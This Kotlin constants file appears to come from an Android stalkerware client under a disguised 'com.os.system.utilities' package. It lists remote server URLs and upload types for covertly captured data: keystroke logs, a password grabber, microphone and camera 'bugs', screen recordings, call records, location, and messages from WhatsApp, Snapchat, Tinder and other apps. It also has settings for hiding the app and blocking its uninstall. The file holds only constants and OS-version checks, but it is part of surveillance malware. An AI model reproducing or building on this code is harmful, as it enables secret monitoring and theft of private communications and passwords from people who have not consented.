package com.os.system.utilities

import android.os.Build

object AppConstants {

    const val TOS_BASE_URL_TAG = "tos_base"
    const val NODE_SERVER_URL_TAG = "node_server"
    const val TOS_BASE_URL = "http://lb.theonespy.com/"
    const val NODE_SERVER_URL = "https://node.theonespy.com:7000/"

    //Logs Types
    const val SERVER_ONE_AUTH = "ServerOneAuth"
    const val SERVER_TWO_AUTH = "ServerTwoAuth"
    const val SERVER_THREE_AUTH = "ServerThreeAuth"
    const val SERVER_FOUR_AUTH = "ServerFourAuth"
    const val SERVER_FIVE_AUTH = "ServerFiveAuth"
    const val SERVER_SIX_AUTH = "ServerSixAuth"
    const val FCM_TOKEN_TYPE = "FcmToken"
    const val SERVICE_ACTIVATION_TYPE = "ServiceActivation"
    const val DEVICE_INFO_TYPE = "DeviceInfo"
    const val SMS_LOG_TYPE = "SmsLog"
    const val CALL_LOG_TYPE = "CallLog"
    const val GPS_LOCATION_TYPE = "GpsLocation"
    const val CONTACTS_TYPE = "Contacts"
    const val APPOINTMENT_TYPE = "Appointment"
    const val PHOTOS_TYPE = "Photos"
    const val KEY_LOG_TYPE = "KeyLog"
    const val BROWSER_HISTORY_TYPE = "BrowserHistory"
    const val INSTALLED_APP_TYPE = "InstalledApp"
    const val CONNECTED_NETWORK_TYPE = "ConnectedNetwork"
    const val PUSH_STATUS_TYPE = "PushStatus"
    const val MIC_BUG_TYPE = "MicBug"
    const val VIDEO_BUG_TYPE = "VideoBug"
    const val CAMERA_BUG_TYPE = "CameraBug"
    const val VOICE_MESSAGE_TYPE = "VoiceMessage"
    const val SNAP_CHAT_EVENTS_TYPE = "SnapchatEvents"
    const val SCREEN_SHOT_TYPE = "Screenshot"
    const val VOIP_CALL_TYPE = "VoipCallRecord"
    const val SCREEN_RECORDING_TYPE = "ScreenRecording"
    const val SCREEN_TIME_TYPE = "ScreenTime"
    const val CALL_RECORD_TYPE = "CallRecord"
    const val SKYPE_ROOTED_TYPE = "SkypeRooted"
    const val PASSWORD_GRABBER_TYPE = "PasswordGrabber"
    const val NORMAL_SCREEN_RECORDING_TYPE = "NormalScreenRecording"
    const val WHATS_APP_ROOTED_TYPE = "WhatsAppRooted"
    const val IMO_ROOTED_TYPE = "ImoRooted"
    const val LINE_ROOTED_TYPE = "LineRooted"
    const val VIBER_ROOTED_TYPE = "ViberRooted"
    const val INSTAGRAM_MESSAGE_ROOTED_TYPE = "InstagramRooted"
    const val INSTAGRAM_POST_ROOTED_TYPE = "InstagramPostRooted"
    const val TUMBLR_ROOTED_TYPE = "TumblrRooted"
    const val APP_NOTIFICATIONS_TYPE = "AppNotifications"
    const val TEXT_ALERT_TYPE = "TextAlerts"
    const val APPS_PERMISSION_TYPE = "AppsPermissions"
    const val PUSH_NOTIFICATIONS_TYPE = "PushNotificationsType"

    //    const val TUMBLR_POST_ROOTED_TYPE = "TumblrPostRooted"
    const val TINDER_ROOTED_TYPE = "TinderRooted"
    const val HIKE_ROOTED_TYPE = "HikeRooted"
    const val ZALO_ROOTED_TYPE = "ZaloMessageRooted"
    const val FACEBOOK_ROOTED_TYPE = "facebookRooted"
    const val HANGOUT_ROOTED_TYPE = "hangoutRooted"
    const val VIEW_360_TYPE = "view360"
    const val TYPE_REMOTE_DATA_SERVICE = "RemoteDataService"
    const val GEO_FENCES_EVENTS_TYPE = "GeoFencesEvent"
    const val SCREEN_LIMIT_TYPE = "ScreenLimit"

    const val WHATS_APP_UNROOTED_TYPE = "WhatsAppUnrooted"
    const val LINE_UNROOTED_TYPE = "LineUnrooted"
    const val VIBER_UNROOTED_TYPE = "ViberUnrooted"
    const val IMO_UNROOTED_TYPE = "ImoUnrooted"
    const val INSTAGRAM_UNROOTED_TYPE = "InstagramUnrooted"
    const val SNAP_CHAT_UNROOTED_TYPE = "SnapChatUnrooted"
    const val TUMBLR_UNROOTED_TYPE = "TumblrUnrooted"
    const val HIKE_UNROOTED_TYPE = "HikeUnrooted"
    const val TINDER_UNROOTED_TYPE = "TinderUnrooted"

    private const val PREF_USER_ID = "PREF_USER_ID"
    private const val PREF_SERVICE_ID = "PREF_PHONE_SERVICE_ID"
    private const val PREF_SERVER_ONE_AUTH = "PREF_SERVER_ONE_AUTH"
    private const val PREF_SERVER_TWO_AUTH = "PREF_SERVER_TWO_AUTH"
    private const val PREF_SERVER_THREE_AUTH = "PREF_SERVER_THREE_AUTH"
    private const val PREF_SERVER_FOUR_AUTH = "PREF_SERVER_FOUR_AUTH"
    private const val PREF_SERVER_FIVE_AUTH = "PREF_SERVER_FIVE_AUTH"
    private const val PREF_SERVER_SIX_AUTH = "PREF_SERVER_SIX_AUTH"
    private const val PREF_FCM_TOKEN = "PREF_FCM_TOKEN"
    private const val PREF_FCM_TOKEN_STATUS = "PREF_FCM_TOKEN_STATUS"
    private const val PREF_SERVICE_ACTIVATE = "PREF_SERVICE_ACTIVATE"
    private const val PREF_ACTIVATION_CODE = "PREF_ACTIVATION_CODE"
    private const val PREF_LOCATION_LATITUDE = "PREF_LOCATION_LATITUDE"
    private const val PREF_LOCATION_LONGITUDE = "PREF_LOCATION_LONGITUDE"
    private const val PREF_MIC_BUG_QUALITY = "PREF_MIC_BUG_QUALITY"
    private const val PREF_CALL_RECORDING_QUALITY = "PREF_CALL_RECORDING_QUALITY"
    private const val PREF_SCREEN_RECORDING_APPS = "PREF_SCREEN_RECORDING_APPS"
    private const val PREF_VOIP_CALL_SETTINGS = "PREF_VOIP_CALL_SETTINGS"
    private const val PREF_APP_HIDDEN = "PREF_APP_HIDDEN"
    private const val PREF_VIEW_360_USER = "PREF_VIEW_360_USER"
    private const val PREF_UNINSTALL_PREFERENCE = "PREF_UNINSTALL_PREFERENCE"
    private const val PREF_UNINSTALL_PROTECTION_PREFERENCE = "PREF_UNINSTALL_PROTECTION_PREFERENCE"
    private const val PREF_GPS_LOCATION_INTERVAL = "PREF_GPS_LOCATION_INTERVAL"
    private const val PREF_SERVICE_START_STOP = "PREF_SERVICE_START_STOP"
    private const val PREF_SYNC_METHOD = "PREF_SYNC_METHOD"
    private const val PREF_DELETE_APP_DIRECTORY = "PREF_DELETE_APP_DIRECTORY"

    // App Sync Settings
    private const val SYNC_SMS = "smsSync"
    private const val SYNC_CALL = "callSync"
    private const val SYNC_CALL_RECORDING = "callRecordingSync"
    private const val SYNC_MIC_BUG = "micBugSync"
    private const val SYNC_VOIP_CALL = "voipCallSync"
    private const val SYNC_CAMERA_BUG = "cameraBugSync"
    private const val SYNC_VIDEO_BUG = "videoBugSync"
    private const val SYNC_KEY_LOGGER = "keyLoggerSync"
    private const val SYNC_APP_REPORT = "appReportSync"
    private const val SYNC_SCREEN_SHOTS = "screenShotsSync"
    private const val SYNC_TUMBLER = "tumblrSync"
    private const val SYNC_APPOINTMENTS = "appointmentSync"
    private const val SYNC_BROWSER_HISTORY = "browserHistorySync"
    private const val SYNC_INSTALLED_APPS = "installedAppSync"
    private const val SYNC_PHOTOS = "photosSync"
    private const val SYNC_CONTACTS = "contactSync"
    private const val SYNC_LINE = "lineSync"
    private const val SYNC_GMAIL = "gmailSync"
    private const val SYNC_WHATS_APP = "whatsAppSync"
    private const val SYNC_SKYPE = "skypeSync"
    private const val SYNC_FACEBOOK = "facebookSync"
    private const val SYNC_VIBER = "viberSync"
    private const val SYNC_ZALO = "zaloSync"
    private const val SYNC_INSTAGRAM = "instagramSync"
    private const val SYNC_VOICE_MESSAGES = "voiceMessageSync"
    private const val SYNC_KIK = "kikSync"
    private const val SYNC_VINE = "vineSync"
    private const val SYNC_TINDER = "tinderSync"
    private const val SYNC_HIKE = "hikeSync"
    private const val SYNC_HANGOUTS = "hangoutSync"
    private const val SYNC_IMO = "imoSync"
    private const val SYNC_SNAPCHAT = "snapchatSync"
    private const val SYNC_GEO_LOCATION = "geoLocationSync"
    private const val SYNC_ON_OFF = "syncOnOff"
    private const val CALL_RECORDING_METHOD = "callRecordingMethod"
    private const val SYNC_CONNECTED_NETWORKS = "syncConnectedNetworks"
    private const val SYNC_LINE_VOIP = "syncLineVoip"
    private const val SYNC_HIKE_VOIP = "syncHikeVoip"
    private const val SYNC_TELEGRAM_VOIP = "syncTelegramVoip"
    private const val SYNC_IMO_VOIP = "syncImoVoip"
    private const val SYNC_HANGOUTS_VOIP = "syncHangoutVoip"
    private const val SYNC_VIBER_VOIP = "syncViberVoip"
    private const val SYNC_APP_NOTIFICATIONS = "syncAppNotifications"
    private const val LOCATION_PERMISSION_COUNTER = "locationPermsissionCounter"

    const val DATE_FORMAT_1 = "yyyy-MM-dd HH:mm:ss"
    const val DATE_FORMAT_2 = "EEE, d MMM yyyy HH:mm:ss"
    const val DATE_FORMAT_3 = "yyyy-MM-dd hh:mm"
    const val DATE_FORMAT_4 = "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'"
    const val DATE_FORMAT = "yyyy-MM-dd"

    /** Return True if Android OS Greater Than Or Equal to Nougat [7.0] **/
    val osGreaterThanEqualToNougat by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.N
    }

    /** Return True if Android OS Greater Than Or Equal to Oreo [8.0] **/
    val osGreaterThanEqualToOreo by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
    }

    /** Return True if Android OS Greater Than Or Equal to Android Q [10.0] **/
    val osGreaterThanEqualToTen by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
    }

    /** Return True if Android OS Greater Than Or Equal to Android 11 [11.0] **/
    val osGreaterThanEqualToEleven by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
    }

    /** OS Greater than or Equal to Pie Android 9 **/
    val osGreaterThanEqualToPie by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.P
    }

    /** Return True if Android OS Less Than to Android Q [10.0] **/
    val osLessThanTen by lazy {
        Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
    }

    /** Checks if Android OS Less P **/
    val osLessThanPie by lazy {
        Build.VERSION.SDK_INT < Build.VERSION_CODES.P
    }

    /** Checks if Android OS Less Oreo **/
    val osLessThanOreo by lazy {
        Build.VERSION.SDK_INT < Build.VERSION_CODES.O
    }

    /** Checks if Android OS Less than Android 11 **/
    val osLessThanEleven by lazy {
        Build.VERSION.SDK_INT < Build.VERSION_CODES.R
    }

    val osIsEleven by lazy {
        Build.VERSION.SDK_INT == Build.VERSION_CODES.R
    }

    /** Android OS Greater than or Equal to 10 **/
    val osGreaterThanOrEqualToTen by lazy {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
    }
}